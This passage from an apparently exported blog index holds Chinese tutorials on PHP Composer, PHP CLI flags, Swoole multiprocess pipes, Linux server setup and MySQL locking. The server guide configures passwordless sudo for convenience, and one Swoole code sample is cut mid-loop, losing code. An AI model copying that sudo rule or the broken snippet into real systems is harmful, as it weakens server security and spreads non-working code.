分布式服务随着业务拆分越来越小，存储系统越来越庞大，应用系统的整体复杂度呈指数级增加，部署维护越来越困难。由于所有应用要和所有数据库系统连接，在数万台服务器规模的网站中，这些连接的数目是服务器规模的平方，导致数据库连接资源不足，拒绝服务。既然每一个应用系统都需要执行许多相同的业务操作，比如用户管理、商品管理等，那么可以将这些共用的业务提取出来，独立部署。由这些可复用的业务连接数据库，提供共用业务服务，而应用系统只需要管理用户界面，通过分布式服务调用共用业务服务完成具体业务操作。如下图所示：大型网站的架构演化到这里，基本上大多数的技术问题都可以得以解决了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHP神器之Composer]]></title>
      <url>%2F2016%2F12%2F27%2Fphp%E7%A5%9E%E5%99%A8%E4%B9%8Bcomposer%2F</url>
      <content type="text"><![CDATA[Composer是一个非常流行的PHP包依赖管理工具,已经取代PEAR包管理器,对于PHP开发者来说掌握Composer是必须的. 对于使用者来说Composer非常的简单,通过简单的一条命令将需要的代码包下载到vendor目录下,然后开发者就可以引入包并使用了. 其中的关键在于你项目定义的composer.json,可以定义项目需要依赖的包(可能有多个),而依赖的包可能又依赖其他的包(这就是组件的好处),这些都不用你烦心,Composer会自动下载你需要的一切,一切在于composer.json的定义. Composer对于使用者来说是很透明,但是其背后的理念还是需要了解一下的,其的诞生也不是偶然的,得益于Github的快速发展,PHP语言也越来越现代化,显得更高大上了. 为了理解Composer,先大概了解下其结构: Composer的结构 Composer命令行工具:这个理解就比较简单了,通过使用者定义的Composer.json去下载你需要的代码,假如只是简单的使用Composer,那么掌握一些具体命令就完全可以了 Autoloading代码加载器:通过Composer,开发者可以通过多种方式去使用,而其中的关键在于PHP的命名空间概念,以及PSR-4标准的发展,Composer只是根据这二者开发了一个代码自动加载器 Github:有了Github,PHP开发人员可以将开源的代码托管在这上面,而Composer的发展源于Github,Composer本质上就是将Github上的代码下载到本地. Packagist:对于使用者来说使用的是Composer的命令行工具,那么命令行工具怎么知道有多少包可以被用户使用呢,这主要就是依赖于Packagist,Packagist是Composer主要的一个包信息存储库,包开发者将具体代码托管到Github上,将包信息提交到Packagist上,这样使用者就可以通过Composer去使用. Composer根据本地定义的composer.json信息去查询Packagist,Packagist根据Composer.json/Package.json信息解析,最终对应到github仓库,Composer最终下载代码的时候还要依赖于Github仓库上的Composer.json,这里涉及到三种类型的composer.json,含义是不一样的. Composer.json:这是Composer的核心,是Composer的规则,上面也提到了三种类型的Composer.json,在使用的时候一定要注意区分,我初学的时候就总是搞乱.Composer命令行工具 composer init 使用者可以在自己的项目下创建composer.json以便定义你项目的依赖包,也可以通过composer init交互式的创建composer.json. composer install 应该是最常用的命令,composer会根据本地的composer.json安装包,将下载的包放入项目下的vendor目录下,同时将安装时候的包版本信息放入到composer.lock,以便锁定版本. 其实在install的时候,假如发现composer.lock版本和目前vendor目录下的代码版本是一致的,则Composer会什么也不做,composer.lock的目的就是让你安心在目前这个版本下工作,而不获取最新版本的包. composer update 那么如何更新composer.lock以便获取到最新版本的包呢?通过这个命令即可更新最新版本的包 composer config 这个命令还是建议了解下,全局的配置保存在COMPOSER_HOME/config.json,非全局的配置信息则存储在本项目目录下. composer config –list -g composer config -g notify-on-install false composer global config bin-dir –absolutecomposer create-project 这个命令不常用,但是个人觉得还是很重要的,使用普通的install命令是将项目所有的依赖包下载到本项目vendor目录下.而通过这个命令则是将所有的代码及其依赖的包放到一个目录下,相当于执行了一个git clone命令,一般是包的开发者可能为了修复bug会使用该命令. composer global 这是一个全局的安装命令,它允许你在COMPOSER_HOME目录下执行Composer的命令,比如install,update.当然你的COMPOSER_HOME要在$PATH环境下. 比如执行composer global require fabpot/php-cs-fixer,现在php-cs-fixer命令行可以全局运行了,如果稍后想更新它,只需要运行composer global update composer dump-autoload 当你修改项目下的composer.json的文件,并不一定要运行composer update命令进行更新,有的时候可以使用该命令来更新加载器,比如你要引用本地自定义的包(不是来自于packagist),后面会通过实践来说明该命令. composer require 假如手动或者交互式创建composer.json文件,可以直接使用该命令来安装包 composer require cerdic/css-tidy:1.5.2 composer require “ywdblog/phpcomposer:dev-master”–prefer-source和–prefer-dist参数 –prefer-dist:对于稳定的包来说,一般Composer安装默认使用该参数,这也能加快安装,比如有可能直接从packagist安装了相应的包,而不用实际去Github上下载包. –prefer-source:假如使用该参数,则会直接从Github上安装,安装包后vendor目录下还含有.git信息 composer require “ywdblog/phpcomposer:dev-master” –prefer-source #在vendor/ywdblog/phpcomposer目录下含有.git信息如何给Composer添加代理 在国内使用Composer下载特别慢,可以通过二个方法进行加速 composer config repo.packagist composer “https://packagist.phpcomposer.com“ 编辑composer.json “repositories”: { “packagist”: { “type”: “composer”, “url”: “https://packagist.phpcomposer.com“ } }Autoloading代码加载器 composer本身集成一个autoloader,支持PSR-4,PSR-0,classmap,files autoloading. 这里通过一个例子来说明通过Composer如何引用classmap,files,本地符合PSR-4标准的代码 编辑composer.json “autoload”: { “classmap”: [“othsrc/“,“classsrc.php”], “files”: [“othsrc/filesrc.php”], “psr-4”: {“Foo\Bar\”: “src“} }composer dump-autoload 通过上述的操作,对于PSR-4来说等同注册了一个PSR-4 autoloader(从FooBar命名空间) 假如不想使用Composer的autoloader,可以直接包含vendor/composer/autoload_*.php 文件,配置自己的加载器. 具体的例子托管在github上,可参考. Repositories 关于Repositories,了解其不是必须的,但是假如掌握则更能理解Composer,对于Repositories,其中文文档和英文文档解释的很好,这里也进行了一些摘抄. 基本概念 包: Composer是一个依赖管理工具,它在本地安装一些资源包和包的描述(比如包名称和对应的版本),比较重要的元数据描述是dist和source,dist指向一个存档,该存档是对一个资源包的某个版本的数据进行的打包.source指向一个开发中的源,这通常是一个源代码仓库(比如git) 资源库: 一个资源库是一个包的来源.它是一个packages/versions的列表. Composer将查看所有你定义的repositories以找到项目需要的资源包(这句话很重要). 默认情况下已经将Packagist.org注册到Composer(或者理解为Packagist.org是Composer资源库默认的仓库类型) Composer资源库类型 Composer资源库包括四种类型,默认的是composer类型,也就是packagist.org所使用的资源类型. 它使用一个单一的packages.json文件,包含了所有的资源包元数据.当你将包发布到pckagist.org上,则默认系统会创建一个packages.json,不过我没有找到我的包对应的文件. VCS资源库类型 假如你想构建一个私有的Composer私有资源库类型,可以使用该类型,这里举一个例子,比如你在自己项目的composer.json定义如下,则就可以使用对应的Github上的代码了. { “repositories”: [ { “type”: “vcs”, “url”: “https://github.com/ywdblog/phpcomposer“ } ], “require”: { “ywdblog/phpcomposer”: “dev-master” } }当运行composer update的时候,Comoser实际上是从Github上下载包而不是从pckagist.org上下载. 另外假如需要使用Package资源库类型或者PEAR资源库类型,参考官方文档即可,一般在composer.json中定义name、version属性即可. Composer.json 在本文上面也多次提到了composer.json,比如你希望使用第三方包则需要在本地定义composer.json,Composer安装第三方包后,也会在第三方包目录下发现composer.json,那么这二者都叫composer.json,有什么区别呢?理解这非常的重要. 假如你在自己的项目下面定义一个composer.json,则这个包称之为ROOT包,这个composer.json定义你项目需要的条件(比如你的项目可能依赖一个第三方包). composer.json中有些属性只能被ROOT包使用,比如config属性只在ROOT包中生效. 一个资源包是不是ROOT包,取决于它的上下文,比如你git clone ywdblog/phpcomposer,则这时候本地phpcomposer目录就是ROOT包,假如你在本地phpcomposer目录下composer require ywdblog/phpcomposer,则这时候你的项目phpcomposer就是ROOT包. 了解composer-schema.json可参考该网址,Laravel作为一个成熟的框架,其定义的composer.json非常经典 关于包的版本 当使用者在本地配置composer.json的时候,可以指定需要包的特定版本,Composer支持从Github仓库中下载Tag或者分支下的包. 对于Github上的Tag来说,Packagist会创建对应包的版本,它符合X.Y.Z,vX.Y.Z,X.Y.Z-包类型,就是说Github上虽然只有一个特定版本的包,但Composer支持多种形式的引用方式,比如: composer require monolog/monolog 1.0.0-RC1 composer require monolog/monolog v1.0.0-RC1 composer require monolog/monolog 1.0.* composer require monolog/monolog ~1.10对于Github上的分支来说,Packagist会创建对应包的版本,假如分支名看起来像一个版本,将创建{分支名}-dev的包版本号,如果分支名看起来不像一个版本号,它将会创建dev-{分支名}形式的版本号composer require monolog/monolog master-dev composer require monolog/monolog master.x-dev总结: 理解Composer,最重要的是实践,最后也能明白PSR-4和命名空间,也可以尝试将你的项目发布到pckagist.org上. &nbsp;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHP 命令行下的世界]]></title>
      <url>%2F2016%2F12%2F27%2Fphp-%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E7%9A%84%E4%B8%96%E7%95%8C%2F</url>
      <content type="text"><![CDATA[PHP作为一门web开发语言，通常情况下我们都是在Web Server中运行PHP，使用浏览器访问，因此很少关注其命令行操作以及相关参数的使用，但是，特别是在类Unix操作系统上，PHP可以作为一门脚本语言执行与shell类似的处理任务。 php命令行(CLI)参数详解查看PHP的所有命令行参数，使用php -h命令。我们将会对大部分常用的命令行参数进行一一解释，以加深对PHP能力的认识，更加快捷的在服务端命令行下使用PHP或者调试各种因为对环境不熟悉而出现的问题。 -a 以交互式shell模式运行 -c | 指定php.ini文件所在的目录 -n 指定不使用php.ini文件 -d foo[=bar] 定义一个INI实体，key为foo，value为‘bar’ -e 为调试和分析生成扩展信息 -f 解释和执行文件. -h 打印帮助 -i 显示PHP的基本信息 -l 进行语法检查 (lint) -m 显示编译到内核的模块 -r 运行PHP代码，不需要使用标签 ..?&gt; -B 在处理输入之前先执行PHP代码 -R 对输入的没一行作为PHP代码运行 -F Parse and execute for every input line -E Run PHP after processing all input lines -H Hide any passed arguments from external tools. -S : 运行内建的web服务器. -t 指定用于内建web服务器的文档根目录 -s 输出HTML语法高亮的源码 -v 输出PHP的版本号 -w 输出去掉注释和空格的源码 -z 载入Zend扩展文件 . &nbsp; args… 传递给要运行的脚本的参数. 当第一个参数以-开始或者是脚本是从标准输入读取的时候，使用–参数 &nbsp; –ini 显示PHP的配置文件名 &nbsp; –rf 显示关于函数 的信息. –rc 显示关于类 的信息. –re 显示关于扩展 的信息. –rz 显示关于Zend扩展 的信息. –ri 显示扩展 的配置信息.上面列出了PHP命令所有的参数及其注释，接下来，我们将对其中比较常用的参数举例说明。 以交互式shell模式运行php用过 Python 的朋友对Python的交互式shell比较熟悉，在命令行下，如果我们直接输入python命令，则会进入python的交互式shell程序，接下来就可以交互式的执行一些计算任务。 在PHP命令行中，同样提供了类似的功能，使用-a参数即可进入交互shell模式。 在该shell中，我们可以执行一些简单的任务，而不需要总是新建一个php文件。 更详细的使用说明，请参考官方文档 运行内建的Web服务器从PHP 5.4.0开始，PHP的命令行模式提供了一个内建的web服务器。使用-S开始运行web服务。 假设当前我们处在目录/Users/mylxsw/codes/php/aicode/demo，在该目录中，存在index.php文件。 $ ls index.php $ cat index.php &lt;?php echo “Hello, PHPER!”;在该目录中，执行以下命令可以启动内建web服务器，并且默认以当前目录为工作目录$ php -S localhost:8000 PHP 5.6.3 Development Server started at Wed Jun 10 15:49:41 2015 Listening on http://localhost:8000 Document root is /Users/mylxsw/codes/php/aicode/demo Press Ctrl-C to quit.我们另外开启一个shell窗口，请求http://localhost:8000/即可看到脚本输出$ curl -is http://localhost:8000/ HTTP/1.1 200 OK Host: localhost:8000 Connection: close X-Powered-By: PHP/5.6.3 Content-type: text/html; &nbsp; Hello, PHPER!在web服务运行的窗口，可以看到输出的日志信息 以上我们在启动内建服务器的时候，只指定了-S参数让PHP以web服务器的方式运行，这时，PHP会使用当前目录作为工作目录，因此回到当前目录下寻找请求的文件，我们还可以使用-t参数指定其它的目录作为工作目录（文档根目录）。 更多详细信息，请参考官方文档。 查找PHP的配置文件在有的时候，由于服务器上软件安装比较混乱，我们可能安装了多个版本的PHP环境，这时候，如何定位我们的PHP程序使用的是那个配置文件就比较重要了。在PHP命令行参数中，提供了–ini参数，使用该参数，可以列出当前PHP的配置文件信息。 $ php –ini Configuration File (php.ini) Path: /usr/local/etc/php/5.6 Loaded Configuration File: /usr/local/etc/php/5.6/php.ini Scan for additional .ini files in: /usr/local/etc/php/5.6/conf.d Additional .ini files parsed: (none) &nbsp; $ /usr/local/php/bin/php –ini Configuration File (php.ini) Path: /usr/local/php/etc/ Loaded Configuration File: /usr/local/php/etc/php.ini Scan for additional .ini files in: (none) Additional .ini files parsed: (none)上述的服务器上我们安装了两个版本的PHP，由上可以看到，使用php –ini命令可以很方便的定位当前PHP命令将会采用哪个配置文件。 查看类/函数/扩展信息通常，我们可以使用php –info命令或者在在web服务器上的php程序中使用函数phpinfo()显示php的信息，然后再查找相关类、扩展或者函数的信息，这样做实在是麻烦了一些。 $ php –info | grep redis redis Registered save handlers =&gt; files user redis This program is free software; you can redistribute it and/or modify我们可以使用下列参数更加方便的查看这些信息–rf 显示关于函数 的信息. –rc 显示关于类 的信息. –re 显示关于扩展 的信息. –rz 显示关于Zend扩展 的信息. –ri 显示扩展 的配置信息.例如，我们希望查看扩展redis的配置信息$ php –ri redis &nbsp; redis &nbsp; Redis Support =&gt; enabled Redis Version =&gt; 2.2.7查看redis类的信息$ php –rc redis Class [ class Redis ] { &nbsp; - Constants [19] { Constant [ integer REDIS_NOT_FOUND ] { 0 } … - Methods [201] { … Method [ public method echo ] { } …查看函数printf的信息$ php –rf printf Function [ function printf ] { &nbsp; - Parameters [2] { Parameter #0 [ $format ] Parameter #1 [ …$args ] } } 语法检查有时候，我们只需要检查php脚本是否存在语法错误，而不需要执行它，比如在一些编辑器或者IDE中检查PHP文件是否存在语法错误。 使用-l（–syntax-check）可以只对PHP文件进行语法检查。 $ php -l index.php No syntax errors detected in index.php假如此时我们的index.php中存在语法错误$ php -l index.php PHP Parse error: syntax error, unexpected ‘echo’ (T_ECHO) in index.php on line 3 &nbsp; Parse error: syntax error, unexpected ‘echo’ (T_ECHO) in index.php on line 3 Errors parsing index.php 命令行脚本开发在使用PHP开发命令行脚本的时候，与开发web程序是明显不同的，在web程序中，我们可以通过改变url的参数，为PHP环境提供不同的输入，但是在命令行脚本程序中如何获取外部的输入呢？ 在使用C语言开发程序时，我们通常会在main函数中提供两个可选的参数int main(int argc, char *argv[])，这两个参数就是从命令行提供的输入参数。在PHP中，提供了两个全局变量$argc和$argv用于获取命令行输入。 $argc 包含了 $argv数组包含元素的数目 $argv 是一个数组，包含了提供的参数，第一个参数总是脚本文件名称假设我们有一个名为console.php的命令行脚本文件 &lt;?php echo ‘命令行参数个数: ‘ . $argc . “n”; echo “命令行参数:n”; foreach ($argv as $index =&gt; $arg) { echo “ {$index} : {$arg}n”; }在命令行下执行该脚本$ php console.php hello world 命令行参数个数: 3 命令行参数: 0 : console.php 1 : hello 2 : world可以看到，第0个参数是我们执行的脚本名称。需要注意的是，如果提供的第一个参数是以-开头的话，需要在前面增加–，以告诉php这后面的参数是提供给我们的脚本的，而不是php执行文件的（php -r ‘var_dump($argv);’ — -h）。 另外，在脚本中，我们可以通过php_sapi_name()函数判断是否是在命令行下运行的 $ php -r ‘echo php_sapi_name(), PHP_EOL;’ cli]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHP扩展Swoole之进程管理]]></title>
      <url>%2F2016%2F12%2F23%2Fphp%E6%89%A9%E5%B1%95swoole%E4%B9%8B%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%2F</url>
      <content type="text"><![CDATA[Swoole：重新定义PHP第一步安装扩展安装： 下载地址 https://github.com/swoole/swoole-src/releases http://pecl.php.net/package/swoole http://git.oschina.net/matyhtf/swoole下载源代码包后，在终端进入源码目录，执行下面的命令进行编译和安装cd swoolephpize./configuremakesudo make install&nbsp; 编译安装成功后，修改php.ini加入 extension=swoole.so&nbsp; &nbsp; 进程管理模块 查看swoole版本，在命令行里面敲 php –ri swoole更多的php命令行使用，大家学习 php命令行参数ok 我们直奔主题怎么用 多进程的创建不多说，直接上代码 &lt;?php$worker_num =2;//创建的进程数for($i=0;$i&lt;$worker_num ; $i++){ $process = new swoole_process(‘callback_function_we_write’); $pid = $process-&gt;start(); echo PHP_EOL . $pid;//}function callback_function_we_write(swoole_process $worker){ echo PHP_EOL; var_dump($worker); echo PHP_EOL;}&nbsp; 运行结果如下 5445object(swoole_process)#1 (3) { [“pipe”]=&gt; int(3) [“callback”]=&gt; string(26) “callback_function_we_write” [“pid”]=&gt; int(5445)} 5446object(swoole_process)#2 (3) { [“pipe”]=&gt; int(5) [“callback”]=&gt; string(26) “callback_function_we_write” [“pid”]=&gt; int(5446)}&nbsp; 可以看到，我们使用 new swoole_process 创建进程，这里需要一个参数，也就是回调函数当我们使用 $process-&gt;start()执行后，返回这个进程的pid ，也就是 $pid.此时子进程启动，调用回调函数，并传一个参数 也就是 swoole_process 类型的 $worker我故意输出了 $worker 看看里面有什么，结果有三个属性 pipe 进程的管道id 这个等说道进程间通信的时候再聊 pid 就是当前子进程的 pid 啦 callback 这个是我们自己写的回调函数名到这里，我们就可以用多进程玩耍了， 比如，我们可以测试多进程的运行速度 &lt;?phpecho PHP_EOL . time() ;$worker_num =3;//创建的进程数for($i=0;$i&lt;$worker_num ; $i++){ $process = new swoole_process(‘callback_function_we_write’); $pid = $process-&gt;start();} function callback_function_we_write(swoole_process $worker){ for($i=0;$iread(int $buffer_size=8192); 消息队列 swoole_process->useQueue(); swoole_process->push(string $data); swoole_process->pop(int $maxsize = 8192); &nbsp;我们先说说管道 管道通讯这里我们要再次的提及进程的创建 new swoole_process大家请看这里 进程的创建第一个参数是回调函数，不说了第二个参数含义等会我会结合例子来说第三个参数是默认的 true，意思是创建管道，大家还记得回调函数里我特意将$worker输出看到的内容吗？ object(swoole_process)#1 (3) { [“pipe”]=&gt; int(3) [“callback”]=&gt; string(26) “callback_function_we_write” [“pid”]=&gt; int(5445)}&nbsp; 关键是这里的 pipe 这个就是本进程的管道id我们可以这样理解 每次创建一个进程后，就会随之创建一个管道，主进程想和哪一个进程通信，就向那个进程的管道写入/读取数据。ok，我们看看代码 &lt;?php$redirect_stdout = false;// 重定向输出 ; 这个参数用途等会我们看效果$worker_num = 2;//进程数量$workers = [];//存放进程用的for($i = 0; $i &lt; $worker_num; $i++){ $process = new swoole_process(‘workerFunc’,$redirect_stdout ); $pid = $process-&gt;start(); $workers[$pid] = $process;//将每一个进程的句柄存起来}// 这里是主进程哦。foreach($workers as $pid =&gt; $process){// $process 是子进程的句柄 $process-&gt;write(“hello worker[$pid]\n”);//子进程句柄向自己管道里写内容 $process-&gt;write($data); echo “From Worker: “.$process-&gt;read();//子进程句柄从自己的管道里面读取信息 $process-&gt;read(); echo PHP_EOL.PHP_EOL; } function workerFunc(swoole_process $worker){//这里是子进程哦 $recv = $worker-&gt;read(); echo PHP_EOL. “From Master: $recv\n”; //send data to master $worker-&gt;write(“hello master , this pipe is “. $worker-&gt;pipe .”; this pid is “.$worker-&gt;pid.”\n”); sleep(2); $worker-&gt;exit(0);}&nbsp; 贴上运行结果 From Master: hello worker[8205] From Worker: hello master , this pipe is 3; this pid is 8205 From Master: hello worker[8206] From Worker: hello master , this pipe is 5; this pid is 8206&nbsp; 喔，通讯是这样的。首先 将所有的子进程的句柄都存到 主进程的一个数组里，数组下标就是pid。当主进程想和哪个进程通讯，就使用那个句柄向对应管道里面 写/读 数据，这样就实现了进程间的通讯。 接着，我们稍微改一下，看看运行效果 $redirect_stdout = true;// 重定向输出 注意 这次我改成 true 了，其他没变$worker_num = 2;//进程数量$workers = [];//存放进程用的for($i = 0; $i &lt; $worker_num; $i++){ $process = new swoole_process(‘workerFunc’,$redirect_stdout ); $pid = $process-&gt;start(); $workers[$pid] = $process;//将每一个进程的句柄存起来} // 这里是主进程哦。foreach($workers as $pid =&gt; $process){// $process 是子进程的句柄 $process-&gt;write(“hello worker[$pid]\n”);//子进程句柄向自己管道里写内容 $process-&gt;write($data); echo “From Worker: “.$process-&gt;read();//子进程句柄从自己的管道里面读取信息 $process-&gt;read(); echo PHP_EOL.PHP_EOL; } function workerFunc(swoole_process $worker){//这里是子进程哦 $recv = $worker-&gt;read(); echo PHP_EOL. “From Master: $recv\n”; //send data to master $worker-&gt;write(“hello master , this pipe is “. $worker-&gt;pipe .”; this pid is “.$worker-&gt;pid.”\n”); sleep(2); $worker-&gt;exit(0);}&nbsp; 输出结果 From Worker:From Master: hello worker[8007] From Worker:From Master: hello worker[8008]&nbsp; 诶，不一样了有没有。我们再看看创建进程时第二个参数的说明 $redirect_stdin_stdout，重定向子进程的标准输入和输出。 启用此选项后，在进程内echo将不是打印屏幕，而是写入到管道。读取键盘输入将变为从管道中读取数据。 默认为阻塞读取。我来说明一下，因为创建的时候指定了true，子进程中echo的内容就到了管道里面，而不是打印在屏幕上（这一点类似于php的ob缓存机制，大家想象一下）前面说了，进程的通讯是通过从管道里面读/写数据实现的，而 子进程 里 echo 的内容被 重定向到管道里面了，所以，主进程从管道里读到的内容，就是 子进程中 echo 的 内容。也就造成了上面的 输出结果。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Linux服务器的基本设置]]></title>
      <url>%2F2016%2F12%2F23%2Flinux%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AE%BE%E7%BD%AE%2F</url>
      <content type="text"><![CDATA[开发网站的时候，常常需要自己配置Linux服务器。 本文记录配置Linux服务器的初步流程，也就是系统安装完成后，下一步要做的事情。如果有遗漏，欢迎大家补充。 下面的操作针对Debian/Ubuntu系统，其他Linux系统也类似，就是部分命令稍有不同。 &nbsp; 第一步：root用户登录首先，使用root用户登录远程主机（假定IP地址是192.168.55.242）。 &nbsp; ssh root@192.168.55.242 &nbsp; 这时，命令行会出现警告，表示这是一个新的地址，存在安全风险。键入yes，表示接受。然后，就应该可以顺利登入远程主机。 接着，修改root用户的密码。 &nbsp; passwd 第二步：新建用户首先，添加一个用户组（这里假定为admin用户组）。 &nbsp; addgroup admin 然后，添加一个新用户（假定为bill）。 useradd -d /home/bill -s /bin/bash -m bill 上面命令中，参数d指定用户的主目录，参数s指定用户的shell，参数m表示如果该目录不存在，则创建该目录。 接着，设置新用户的密码。 &nbsp; passwd bill 将新用户（bill）添加到用户组（admin）。 usermod -a -G admin bill &nbsp; 接着，为新用户设定sudo权限。 visudo visudo命令会打开sudo设置文件/etc/sudoers，找到下面这一行。 root ALL=(ALL:ALL) ALL 在这一行的下面，再添加一行。 root ALL=(ALL:ALL) ALL bill ALL=(ALL) NOPASSWD: ALL 上面的NOPASSWD表示，切换sudo的时候，不需要输入密码，我喜欢这样比较省事。如果出于安全考虑，也可以强制要求输入密码。 root ALL=(ALL:ALL) ALL bill ALL=(ALL:ALL) ALL 然后，先退出root用户的登录，再用新用户的身份登录，检查到这一步为止，是否一切正常。 exit ssh bill@128.199.209.242 第三步：SSH设置首先，确定本机有SSH公钥（一般是文件~/.ssh/id_rsa.pub），如果没有的话，使用ssh-keygen命令生成一个。 3，配置公私秘钥对 #生成秘钥 $ ssh-keygen –t rsa # 运行后根据提示执行 # 输入秘钥文件的名称 $ Enter file in which to save the key (/root/.ssh/id_rsa):test # 可以设置ssh秘钥文件密码 $ Enter passphrase (empty for no passphrase): # 再一次输入刚刚的密码 $ Enter same passphrase again: # 完成后会在当前目录生成秘钥test和test.pub，这两个文件一个是私钥，一个是公钥 # 复制公钥到规定文件，顾名思义，公钥是存放在公共的地方，也就是服务器上。私钥就是存放到私人的电脑上。 $ vim ~/.ssh/authorized_keys 复制test.pub里面的内容到该文件内，保存退出 # 更改authorized_keys的权限为600 $ chmod 600 ~/.ssh/authorized_keys &nbsp; 在本机上另开一个shell窗口，将本机的公钥拷贝到服务器的authorized_keys文件。 cat ~/.ssh/id_rsa.pub | ssh bill@128.199.209.242 'mkdir -p .ssh && cat - >> ~/.ssh/authorized_keys' # 或者在服务器端，运行下面命令 echo "ssh-rsa [your public key]" > ~/.ssh/authorized_keys 然后，进入服务器，编辑SSH配置文件/etc/ssh/sshd_config。 sudo cp /etc/ssh/sshd_config ~ sudo nano /etc/ssh/sshd_config 在配置文件中，将SSH的默认端口22改掉，可以改成从1025到65536之间的任意一个整数（这里假定为25000）。 Port 25000 然后，检查几个设置是否设成下面这样，确保去除前面的#号。 Protocol 2 PermitRootLogin no PermitEmptyPasswords no PasswordAuthentication no RSAAuthentication yes PubkeyAuthentication yes AuthorizedKeysFile .ssh/authorized_keys UseDNS no 上面主要是禁止root用户登录，以及禁止用密码方式登录。 接着，在配置文件的末尾，指定允许登陆的用户。 AllowUsers bill 保存后，退出文件编辑。 接着，改变authorized_keys文件的权限。 sudo chmod 600 ~/.ssh/authorized_keys && chmod 700 ~/.ssh/ 然后，重启SSHD。 sudo service ssh restart # 或者 sudo /etc/init.d/ssh restart 下面的一步是可选的。在本机~/.ssh文件夹下创建config文件，内容如下。 Host s1 HostName 128.199.209.242 User bill Port 25000 最后，在本机另开一个shell窗口，测试SSH能否顺利登录。 ssh s1 第四步：运行环境配置首先，检查服务器的区域设置。 locale 如果结果不是en_US.UTF-8，建议都设成它。 # vi /etc/sysconfig/i18n LANG="en_US.UTF-8" SYSFONT="latarcyrheb-sun16" 还有一种方法就是改变环境变量LANG #export LANG="en_US.UTF-8" 不过这样一重新启动就没有，所以要加到/etc/profile里面，这样一开机就会运行这个变量了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[深入浅出MySQL事务处理和锁机制]]></title>
      <url>%2F2016%2F12%2F21%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%92%8C%E9%94%81%E6%9C%BA%E5%88%B6%2F</url>
      <content type="text"><![CDATA[[caption id=”” align=”aligncenter” width=”675”] 锁管理机制[/caption] &nbsp; 1. 事务处理和并发性 1.1. 基础知识和相关概念 1 ）全部的表类型都可以使用锁，但是只有 InnoDB 和 BDB 才有内置的事务功能。 2 ）使用 begin 开始事务，使用 commit 结束事务，中间可以使用 rollback 回滚事务。 3 ）在默认情况下， InnoDB 表支持一致读。 SQL 标准中定义了 4 个隔离级别： read uncommited ， read commited ， repeatable read ， serializable 。 read uncommited 即脏读，一个事务修改了一行，另一个事务也可以读到该行。 如果第一个事务执行了回滚，那么第二个事务读取的就是从来没有正式出现过的值。 ? read commited 即一致读，试图通过只读取提交的值的方式来解决脏读的问题，但是这又引起了不可重复读取的问题。 一个事务执行一个查询，读取了大量的数据行。在它结束读取之前，另一个事务可能完成了对数据行的更改。当第一个事务试图再次执行同一个查询，服务器就会返回不同的结果。 repeatable read 即可重复读，在一个事务对数据行执行读取或写入操作时锁定了这些数据行。 但是这种方式又引发了幻想读的问题。 因为只能锁定读取或写入的行，不能阻止另一个事务插入数据，后期执行同样的查询会产生更多的结果。 serializable 模式中，事务被强制为依次执行。这是 SQL 标准建议的默认行为。 4 ）如果多个事务更新了同一行，就可以通过回滚其中一个事务来解除死锁。 5 ） MySQL 允许利用 set transaction 来设置隔离级别。 6 ）事务只用于 insert 和 update 语句来更新数据表，不能用于对表结构的更改。执行一条更改表结构或 begin 则会立即提交当前的事务。 7 ）所有表类型都支持表级锁，但是 MyISAM 只支持表级锁。 8 ）有两种类型的表级锁：读锁和写锁。 读锁是共享锁，支持并发读，写操作被锁。 写锁是独占锁，上锁期间其他线程不能读表或写表。 8 ）如果要支持并发读写，建议采用 InnoDB 表，因为它是采用行级锁，可以获得更多的更新性能。 9 ）很多时候，可以通过经验来评估什么样的锁对应用程序更合适，不过通常很难说一个锁比别的更好，这全都要依据应用程序来决定，不同的地方可能需要不同的锁。当前 MySQL 已经支持 ISAM, MyISAM, MEMORY (HEAP) 类型表的表级锁了， BDB 表支持页级锁， InnoDB 表支持行级锁。 10 ） MySQL 的表级锁都是写锁优先，而且是采用排队机制，这样不会出现死锁的情况。对于 InnoDB 和 BDB 存储引擎来说，是可能产生死锁的。这是因为 InnoDB 会自动捕获行锁， BDB 会在执行 SQL 语句时捕获页锁的，而不是在事务的开始就这么做。 1.2 不同锁的优缺点及选择 行级锁的优点及选择 ： 1 ）在很多线程请求不同记录时减少冲突锁。 2 ）事务回滚时减少改变数据。 3 ）使长时间对单独的一行记录加锁成为可能。 行级锁的缺点 ： 1 ）比页级锁和表级锁消耗更多的内存。 2 ）当在大量表中使用时，比页级锁和表级锁更慢，因为他需要请求更多的所资源。 3 ）当需要频繁对大部分数据做 GROUP BY 操作或者需要频繁扫描整个表时，就明显的比其它锁更糟糕。 4 ）使用更高层的锁的话，就能更方便的支持各种不同的类型应用程序，因为这种锁的开销比行级锁小多了。 5 ）可以用应用程序级锁来代替行级锁，例如 MySQL 中的 GET_LOCK() 和 RELEASE_LOCK() 。但它们是劝告锁（原文： These are advisory locks ），因此只能用于安全可信的应用程序中。 6 ）对于 InnoDB 和 BDB 表， MySQL 只有在指定用 LOCK TABLES 锁表时才使用表级锁。在这两种表中，建议最好不要使用 LOCK TABLES ，因为 InnoDB 自动采用行级锁， BDB 用页级锁来保证事务的隔离。 表锁的优点及选择： 1 ）很多操作都是读表。 2 ）在严格条件的索引上读取和更新，当更新或者删除可以用单独的索引来读取得到时： UPDATE tbl_name SET column=value WHERE unique_key_col=key_value;DELETE FROM tbl_name WHERE unique_key_col=key_value; 3 ） SELECT 和 INSERT 语句并发的执行，但是只有很少的 UPDATE 和 DELETE 语句。 4 ）很多的扫描表和对全表的 GROUP BY 操作，但是没有任何写表。 表锁的缺点： 1 ）一个客户端提交了一个需要长时间运行的 SELECT 操作。 2 ）其他客户端对同一个表提交了 UPDATE 操作，这个客户端就要等到 SELECT 完成了才能开始执行。 3 ）其他客户端也对同一个表提交了 SELECT 请求。由于 UPDATE 的优先级高于 SELECT ，所以 SELECT 就会先等到 UPDATE 完成了之后才开始执行，它也在等待第一个 SELECT 操作。 1.3. 如何避免锁的资源竞争 1 ）让 SELECT 速度尽量快，这可能需要创建一些摘要表。 2 ）启动 mysqld 时使用参数 